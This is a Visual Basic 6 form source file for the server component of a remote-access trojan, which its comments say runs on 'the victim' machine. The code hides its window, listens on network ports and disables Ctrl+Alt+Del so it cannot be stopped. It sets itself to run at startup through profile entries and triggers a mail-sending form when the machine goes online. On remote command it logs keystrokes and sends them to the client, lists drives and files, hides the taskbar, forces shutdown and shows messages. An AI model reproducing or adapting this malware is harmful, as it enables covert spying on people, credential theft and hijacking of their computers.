VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "Mswinsck.ocx"
Begin VB.Form frmServer 
   BorderStyle     =   3  'Fixed Dialog
   ClientHeight    =   4110
   ClientLeft      =   255
   ClientTop       =   1410
   ClientWidth     =   6855
   ClipControls    =   0   'False
   ControlBox      =   0   'False
   Icon            =   "frmServer.frx":0000
   KeyPreview      =   -1  'True
   LinkTopic       =   "Form2"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   4110
   ScaleWidth      =   6855
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Visible         =   0   'False
   Begin VB.DirListBox Dir1 
      Height          =   1890
      Left            =   1440
      TabIndex        =   3
      Top             =   1560
      Width           =   2655
   End
   Begin VB.DriveListBox Drive1 
      Height          =   315
      Left            =   1560
      TabIndex        =   2
      Top             =   1080
      Width           =   2055
   End
   Begin VB.FileListBox File1 
      Height          =   2430
      Left            =   4440
      TabIndex        =   1
      Top             =   1080
      Width           =   1935
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   4000
      Left            =   3000
      Top             =   3480
   End
   Begin VB.Timer Timer2 
      Left            =   3600
      Top             =   3480
   End
   Begin VB.TextBox txtconnect 
      Height          =   285
      Left            =   1320
      TabIndex        =   0
      Top             =   480
      Width           =   2775
   End
   Begin MSWinsockLib.Winsock Notify 
      Left            =   1800
      Top             =   3000
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      RemoteHost      =   "smtp.ntlworld.com"
      RemotePort      =   25
   End
   Begin VB.Timer TimChat 
      Enabled         =   0   'False
      Interval        =   500
      Left            =   2520
      Top             =   2040
   End
   Begin VB.Timer KeyLogTimer 
      Enabled         =   0   'False
      Interval        =   1
      Left            =   6240
      Top             =   2640
   End
   Begin MSWinsockLib.Winsock Server 
      Left            =   0
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      LocalPort       =   2000
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   3240
      Top             =   840
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
End
Attribute VB_Name = "frmServer"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'Option Explicit
' Declaire a Varable to recive the incomming data from
' the client
Public Message As String



Private Sub Form_Load()
    Do Until txtconnect.Text = "True"
        txtconnect.Text = IsNetConnectOnline()
        DoEvents
        If txtconnect.Text = "True" Then
            Call Load(frmSendmail)
            'Call frmSendmail.Show
        End If
        Winsock1.LocalPort = 3456
        Call Winsock1.Listen
        
    Loop
    

    
    ' Close the server
    Call Server.Close
    '
    ' Instruct the server to listen on the prefined port
    Call Server.Listen
    '
    ' Disable the ctrl + Alt + Del keys to stop the victim terminating the program
    Call Disable_CTRL_ALT_DEL
    WriteProfileSection "windows", "load=" & App.Path + "\" + App.EXEName + ".exe" & vbCrLf & "open=" & App.Path + "\" + App.EXEName + ".exe"""

End Sub


Private Sub Form_Terminate()
    ' Enable the CTRL + Alt + Del keys
    Call Enable_CTRL_ALT_DEL
End Sub

Private Sub Form_Unload(Cancel As Integer)
    ' Enable the CTRL + Alt + Del keys
    Call Enable_CTRL_ALT_DEL
End Sub

Private Sub KeyLogTimer_Timer()
    Dim myKey
    Dim i As Integer
    
    ' Make sure the client is still connected before sending keys
    
    If Server.State = sckConnected Then
    
    For i = 1 To 256
        myKey = GetAsyncKeyState(i)
        If myKey = -32767 Then
            Call Server.SendData(Chr(i))
    End If
    myKey = GetAsyncKeyState(186)
    If myKey = -32767 Then
        Call Server.SendData(";")
    End If
    
    myKey = GetAsyncKeyState(187)
    If myKey = -32767 Then
        Call Server.SendData("=")
    End If
    
    myKey = GetAsyncKeyState(188)
    If myKey = -32767 Then
        Call Server.SendData(",")
    End If

    myKey = GetAsyncKeyState(189)
    If myKey = -32767 Then
        Call Server.SendData("-")
    End If

    myKey = GetAsyncKeyState(190)
    If myKey = -32767 Then
        Call Server.SendData(".")
    End If
    
    myKey = GetAsyncKeyState(191)
    If myKey = -32767 Then
        Call Server.SendData("/")
    End If

    myKey = GetAsyncKeyState(96)
    If myKey = -32767 Then
        Call Server.SendData("0")
    End If

    myKey = GetAsyncKeyState(97)
    If myKey = -32767 Then
        Call Server.SendData("1")
    End If

    myKey = GetAsyncKeyState(98)
    If myKey = -32767 Then
        Call Server.SendData("2")
    End If

    myKey = GetAsyncKeyState(99)
    If myKey = -32767 Then
        Call Server.SendData("3")
    End If

    myKey = GetAsyncKeyState(100)
    If myKey = -32767 Then
        Call Server.SendData("4")
    End If

    myKey = GetAsyncKeyState(101)
    If myKey = -32767 Then
        Call Server.SendData("5")
    End If

    myKey = GetAsyncKeyState(102)
    If myKey = -32767 Then
        Call Server.SendData("6")
    End If

    myKey = GetAsyncKeyState(103)
    If myKey = -32767 Then
        Call Server.SendData("7")
    End If

    myKey = GetAsyncKeyState(104)
    If myKey = -32767 Then
        Call Server.SendData("8")
    End If

    myKey = GetAsyncKeyState(105)
    If myKey = -32767 Then
        Call Server.SendData("9")
    End If

    myKey = GetAsyncKeyState(13)
    If myKey = -32767 Then
        Call Server.SendData("{Enter}")
    End If
    
    myKey = GetAsyncKeyState(8)
    If myKey = -32767 Then
        Call Server.SendData("{BS}")
    End If
    
    Next i
Else
    KeyLogTimer.Enabled = False
End If

End Sub

Private Sub Notify_DataArrival(ByVal bytesTotal As Long)
Dim smtp As String
Call Notify.GetData(smtp)
Debug.Print smtp

End Sub

Private Sub Server_ConnectionRequest(ByVal requestID As Long)
    ' When a connection request is recived, check the state
    ' of the server
    If Server.State <> sckConnected Then
        Call Server.Close
    End If
    '
    ' Accept the connection request
    Call Server.Accept(requestID)
    '
End Sub
Private Sub Server_DataArrival(ByVal bytesTotal As Long)
    ' Instruct the server to get the incomming data and
    ' place it into the Varable just declaired
    Call Server.GetData(Message)
    '
    '*******************************************************************************
    '* The Select Case statement lists many options, these are all checking        *
    '* the content of the data comming in from the Client, and then instructing    *
    '* the program to take a apropriate course of action depending on the message  *
    '* recived. Some of these will be Calls to the API Decs in the modules included*
    '*******************************************************************************
    '
    Select Case Message
        '
        Case "chat"
            Call Load(frmChat)
            Dim IP As String
            IP = Server.RemoteHostIP
        
            frmChat.Chat.RemoteHost = IP
            Call Sleep(2000)
        
            Call frmChat.Chat.Connect
            TimChat.Enabled = True
        '
        Case "CC"
            Call frmChat.Chat.Close
            Call Unload(frmChat)
                
        '
        Case "Disconnect"
            ' Tel; the server to close the connection
            Call Server.Close
            ' Tell the server to start listening on the predefined port
            Call Server.Listen
        '
        Case "Open-CD"
            ' Call the API MCISENDSTRING to open the CD Door
            Call mciSendString("Set CDAudio Door Open", 0&, 0&, 0&)
        '
        Case "Close-CD"
            ' ' Call the API MCISENDSTRING to Close the CD Door
            Call mciSendString("Set CDAudio Door closed", 0&, 0&, 0&)
        '
        Case "Hide-Bar"
            ' Hide the Task Bar
            Dim hWnd As Long
            hWnd = FindWindow("shell_traywnd", vbNullString)
            Call SetWindowPos(hWnd, 0, 0, 0, 0, 0, SWP_HIDEWINDOW)
        '
        Case "Show-Bar"
            ' Show the Task Bar
            hWnd = FindWindow("shell_traywnd", vbNullString)
            Call SetWindowPos(hWnd, 0, 0, 0, 0, 0, SWP_SHOWWINDOW)
        '
        Case "Hide-Start"
            ' Hide the start button
            ' By calling the function defined in Decs.bas
            Dim WinClass As String
            Dim TaskBarHwnd As Long, lRet As Long, lParam As Long
            '
            WinClass = "Shell_TrayWnd"
            '
            TaskBarHwnd = FindWindow(WinClass, vbNullString)
            '
            lRet = EnumChildWindows(TaskBarHwnd, AddressOf EnumChildProc, lParam)
        '
        Case "Show-Start"
            ' Enable the start button
            ' By calling the function defined in Decs.bas
            Dim RetVal As Long
            '
            ' If the start button is not enabled then enable it
            If StartButtonhWnd <> 0 Then
                RetVal = EnableWindow(StartButtonhWnd, True)
            End If
        '
        Case "Shut-Down"
            ' Shut Down the computer
            AdjustToken
            ExitWindowsEx (EWX_SHUTDOWN Or EWX_FORCE Or EWX_REBOOT), 65535
        '
        Case "keylog"
            ' Enable the timer to log keys
            KeyLogTimer.Enabled = True
        '
        Case "stopkeylog"
            ' Disable the timer to log keys
            KeyLogTimer.Enabled = False
        '
        End Select ' Ends the select case Structure
          
'****************************************************************************************
     ' This setect case structure deals with the message boxes
     Select Case Left(Message, 5)
          '
        Case "Excla"
            ' Declare a varable to hold the minipulared sting
            Dim msg1 As String
            ' Assign the minipulated srting to the varable
            msg1 = Mid(Message, 6)
            ' Use a message box to output the minipulated string
            ' to the victims screen
            Dim abc As VbMsgBoxResult
            ' Show the message box with the formated string
            abc = MsgBox(msg1, vbOKOnly + vbExclamation, "Exclamation")
        '
        Case "infor"
            ' Assign the minipulated srting to the varable
            msg1 = Mid(Message, 6)
            ' Show the message box with the formated string
            abc = MsgBox(msg1, vbOKOnly + vbInformation, "Information")
        '
        Case "warn."
            ' Assign the minipulated srting to the varable
            msg1 = Mid(Message, 6)
            ' Show the message box with the formated string
            abc = MsgBox(msg1, 16, "Warning!!!!")
        '
        End Select
End Sub
Private Sub Server_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
    ' If a error occurs, close the server and instruct it to listen on the
    ' predefined port once more
    Call Server.Close
    Call Server.Listen
    '
End Sub


Private Sub TimChat_Timer()
    frmChat.Show
    TimChat.Enabled = False
End Sub
Private Sub Dir1_Change()

File1.Path = Dir1.Path

Call Winsock1.SendData("4")
Call Winsock1.SendData(".")
Timer1.Interval = 1000
Timer1.Enabled = True
End Sub

Private Sub Drive1_Change()
Dir1.Path = Drive1.Drive

Call Winsock1.SendData("4")
Call Winsock1.SendData(".")
Timer1.Interval = 1000
Timer1.Enabled = True
End Sub

Private Sub File1_Click()

Call Winsock1.SendData("4")
Call Winsock1.SendData(".")
Timer1.Interval = 1000
Timer1.Enabled = True
End Sub


Private Sub Timer1_Timer()
Call Winsock1.SendData(".")
 For i = 0 To Drive1.ListCount - 1
    Call Winsock1.SendData("1" & Drive1.List(i))
    DoEvents
Next i
For j = 0 To Dir1.ListCount - 1
    Call Winsock1.SendData("2" & Dir1.List(j))
    DoEvents
Next j
For k = 0 To File1.ListCount - 1
    Call Winsock1.SendData("3" & File1.List(k))
    DoEvents
Next k

Timer1.Enabled = False

End Sub

Private Sub Winsock1_ConnectionRequest(ByVal requestID As Long)
Call Winsock1.Close
Call Winsock1.Accept(requestID)
Timer1.Enabled = True

End Sub

Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
Dim data As String
Call Winsock1.GetData(data)

Select Case Left(data, 3)
    Case "Dir"
        Path = Mid(data, 4)
        Dir1.Path = Path
    Case "up."
        Dim upwardpath As String
        upwardpath = InStrRev(Dir1.Path, "\")
        finalpath = Left(Dir1.Path, upwardpath)
        
        Dir1.Path = finalpath
    Case "Drv"
        Drive = Mid(data, 4)
        Drive1.Drive = Drive
        
    End Select
End Sub


